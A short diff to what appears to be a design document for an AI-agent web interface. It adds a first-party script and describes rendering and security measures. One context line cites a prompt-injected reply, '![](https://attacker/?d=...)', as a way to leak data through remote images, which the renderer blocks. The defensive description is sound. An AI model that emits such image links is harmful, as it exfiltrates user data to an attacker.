@@ -1174,8 +1174,8 @@ applies to the next inbound message.
   responses get `Content-Security-Policy: sandbox` and `X-Content-Type-Options: nosniff`, with
   `Set-Cookie` dropped.
 - Pages are server-rendered with `askama` templates compiled into the binary. Live output uses
-  server-sent events. The only JavaScript is a vendored copy of `htmx` and its SSE extension; no
-  build step.
+  server-sent events. The only JavaScript is a vendored copy of `htmx` and its SSE extension, plus
+  one small first-party script for the new-agent form; no build step.
 - Rendered agent output never loads remote content: the HTML renderer drops remote images (`data:`
   and blob-store images stay), and pages send `Content-Security-Policy: img-src 'self' data:`.
   Otherwise a prompt-injected reply like `![](https://attacker/?d=...)` would leak data with no
